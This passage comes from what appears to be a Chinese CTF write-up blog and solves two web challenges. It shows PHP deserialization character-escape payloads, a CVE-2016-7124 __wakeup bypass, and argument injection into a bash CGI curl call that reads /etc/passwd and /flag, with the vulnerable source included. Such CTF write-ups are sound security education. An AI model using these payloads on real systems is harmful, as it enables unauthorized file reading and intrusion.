&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;fuck_no_girlfriend!!!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>考點是反序列化字元逃逸，有三個字串替換，關係如下所示。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php --&gt; 字串長度 +5</span><br><span class="line">boyfriend --&gt; 字串長度 -1</span><br><span class="line">flag --&gt; 字串長度 +4</span><br></pre></td></tr></table></figure>
+
+<p>需要的最後結果是 Hed9eh0g 的值為 has_girlfriend。因此只需要寫出這樣的 payload 即可成功逃逸到 Hed9eh0g。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = str_repeat(<span class="string">&quot;flag&quot;</span>, <span class="number">10</span>) . str_repeat(<span class="string">&quot;php&quot;</span>,<span class="number">1</span>) . str_repeat(<span class="string">&quot;boyfriend&quot;</span>,<span class="number">5</span>) .<span class="string">&#x27;&quot;;s:8:&quot;Hed9eh0g&quot;;s:14:&quot;has_girlfriend&quot;;&#125;&#x27;</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>此時序列化出來的字串是這樣的。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:3:&quot;A&amp;D&quot;;s:128:&quot;hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!hack!!!!&quot;;s:8:&quot;Hed9eh0g&quot;;s:14:&quot;has_girlfriend&quot;;&#125;&quot;;s:8:&quot;Hed9eh0g&quot;;s:13:&quot;no_girlfriend&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>將 payload 拼接到請求中傳送即可在響應中得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841035434.1f4c89da97f6005f6369a03bda02303e2934c8dc.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newsctf&#123;i_Lov3_nEws4tF_wEb&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EZ套娃"><a href="#EZ套娃" class="headerlink" title="EZ套娃"></a>EZ套娃</h3><p>第一步是程式碼審計拿 hint，給出的程式碼如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line">header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">            @<span class="keyword">$this</span>-&gt;hint = base64_encode(file_get_contents(<span class="keyword">$this</span>-&gt;hint)); </span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hint != <span class="string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; </span><br><span class="line">            <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = <span class="string">&quot;╰(●’◡’●)╮&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> User(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/is&#x27;</span>,<span class="variable">$a</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line">unserialize(read(write(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>主要的考點是字元多變字元少的反序列化字元逃逸，以及 PHP 5.4.4 下的 CVE-2016-7124 即 <code>__wakeup()</code> 的繞過。於是寫出如下 payload 拿到 hint。</p>
+<blockquote>
+<p>Fixed In Version: php 5.6.25, php 7.0.10</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = str_repeat(<span class="string">&#x27;\0\0\0&#x27;</span>,<span class="number">8</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;t&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">//It will be O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot; *  *  *  *  *  *  *  * &quot;;s:8:&quot;password&quot;;s:60:&quot;t&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&#125;&quot;;&#125; when serialized by the program</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dde200ba-a6d9-4e0a-b8ad-4e8f696622f7/1613389841218491.5440a5f5020440ae151d6f63ebd9e6801ebcbe66.png"></p>
+<p>payload 傳送之後得到如下資訊。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7CiAvLyBZb3UgY2FuJ3Qgc2VlIG1lfgo&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>將其 base64 解碼後可得如下 hint。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure>
+
+<p>定向到這個路由，發現是一個由 curl 發起請求的響應。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;args&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Bob&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="attr">&quot;headers&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;Host&quot;</span>: <span class="string">&quot;httpbin.org&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;User-Agent&quot;</span>: <span class="string">&quot;curl/7.64.0&quot;</span>, </span><br><span class="line">    <span class="attr">&quot;X-Amzn-Trace-Id&quot;</span>: <span class="string">&quot;Root=1-602a67c5-2bbcf35059d5a41c03702149&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;114.67.246.176&quot;</span>, </span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;http://httpbin.org/get?name=Bob&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同時再次嘗試可以發現引數 name 可控，於是嘗試在其中拼接一些 curl 的引數指令。在 name 引數後面拼接 <code> file:///etc/passwd</code> 可以發現如下回顯。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;lemon&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;curl&#x2F;7.64.0&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-602a6a25-31c02675388dc74e545082fa&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;114.67.246.176&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;lemon&quot;</span><br><span class="line">&#125;</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure>
+
+<p>於是構造出 <code>file:///flag</code>，成功得到了 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b07006f7bdb7be77f633298e0e1829f5&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同時附上這題 <code>index.cgi</code> 的原始碼。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.cgi </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ./_dep/web.cgi</span><br><span class="line">echo_headers</span><br><span class="line"></span><br><span class="line">name=<span class="variable">$&#123;_GET[&quot;name&quot;]&#125;</span></span><br><span class="line"></span><br><span class="line">[[ <span class="variable">$name</span> == <span class="string">&quot;&quot;</span> ]] &amp;&amp; name=<span class="string">&#x27;Bob&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -v http://httpbin.org/get?name=<span class="variable">$name</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./_dep/web.cgi</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">WEBASH_VERSION=<span class="string">&#x27;0.1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Some notes:</span></span><br><span class="line"><span class="comment"># - The aim is to use native bash as much as possible</span></span><br><span class="line"><span class="comment"># - printf is more secure than echo because you can&#x27;t tell echo to stop processing parameters</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make bash intolerant of errors</span></span><br><span class="line"><span class="comment"># set -ef -o pipefail</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">url_decode</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> data=<span class="string">&quot;<span class="variable">$&#123;*//+/ &#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&#x27;%b&#x27;</span> <span class="string">&quot;<span class="variable">$&#123;data//%/\\x&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">url_encode</span></span>() &#123;</span><br><span class="line">    <span class="comment"># Modified from https://gist.github.com/cdown/1163649</span></span><br><span class="line">    old_lc_collate=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span></span><br><span class="line">    LC_COLLATE=<span class="string">&quot;C&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">local</span> length=<span class="string">&quot;<span class="variable">$&#123;#1&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> (( pos = 0; pos &lt; length; pos++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">local</span> chr=<span class="string">&quot;<span class="variable">$&#123;1:pos:1&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$chr</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">            <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&#x27;+&#x27;</span></span><br><span class="line">                ;;</span><br><span class="line">            [a-zA-Z0-9.~_-])</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$chr</span>&quot;</span></span><br><span class="line">                ;;</span><br><span class="line">            *)</span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&#x27;%%%02X&#x27;</span> <span class="string">&quot;&#x27;<span class="variable">$chr</span>&quot;</span></span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    </span><br><span class="line">    LC_COLLATE=<span class="string">&quot;<span class="variable">$old_lc_collate</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">html</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> str=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//&lt;/&amp;lt;&#125;</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//&gt;/&amp;gt;&#125;</span>&quot;</span></span><br><span class="line">    str=<span class="string">&quot;<span class="variable">$&#123;str//\&quot;/&amp;quot;&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$str</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http_status_code=<span class="string">&quot;200 OK&quot;</span></span><br><span class="line"><span class="function"><span class="title">http_status</span></span>() &#123;</span><br><span class="line">    http_status_code=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -A http_headers</span><br><span class="line"><span class="function"><span class="title">http_header</span></span>() &#123;</span><br><span class="line">    http_headers[<span class="string">&quot;<span class="variable">$1</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">echo_headers</span></span>() &#123;</span><br><span class="line">    http_header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=utf-8&quot;</span></span><br><span class="line">    http_header <span class="string">&quot;X-Server&quot;</span> <span class="string">&quot;webash/<span class="variable">$WEBASH_VERSION</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output headers</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Status: %s\r\n&quot;</span> <span class="string">&quot;<span class="variable">$http_status_code</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!http_headers[@]&#125;</span>&quot;</span>; <span class="keyword">do</span> </span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;%s: %s\r\n&quot;</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;http_headers[$name]&#125;</span>&quot;</span>; </span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">http_error</span></span>() &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Status: 500 Internal Server Error\r\n\r\nInternal Server Error&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse the query into $_GET</span></span><br><span class="line">IFS=<span class="string">&#x27;&amp;;&#x27;</span> <span class="built_in">read</span> -a query &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$QUERY_STRING</span>&quot;</span></span><br><span class="line"><span class="built_in">declare</span> -A _GET</span><br><span class="line"><span class="keyword">for</span> name_value_str <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;query[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    IFS=<span class="string">&#x27;=&#x27;</span> <span class="built_in">read</span> -a name_value &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$name_value_str</span>&quot;</span></span><br><span class="line">    name=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[0]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    value=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[1]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    _GET[<span class="string">&quot;<span class="variable">$name</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$value</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parse the POST into $_POST</span></span><br><span class="line">IFS=<span class="string">&#x27;&amp;;&#x27;</span> <span class="built_in">read</span> -a query</span><br><span class="line"><span class="built_in">declare</span> -A _POST</span><br><span class="line"><span class="keyword">for</span> name_value_str <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;query[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    IFS=<span class="string">&#x27;=&#x27;</span> <span class="built_in">read</span> -a name_value &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$name_value_str</span>&quot;</span></span><br><span class="line">    name=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[0]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    value=<span class="string">&quot;<span class="subst">$(url_decode <span class="string">&quot;<span class="variable">$&#123;name_value[1]&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    _POST[<span class="string">&quot;<span class="variable">$name</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$value</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
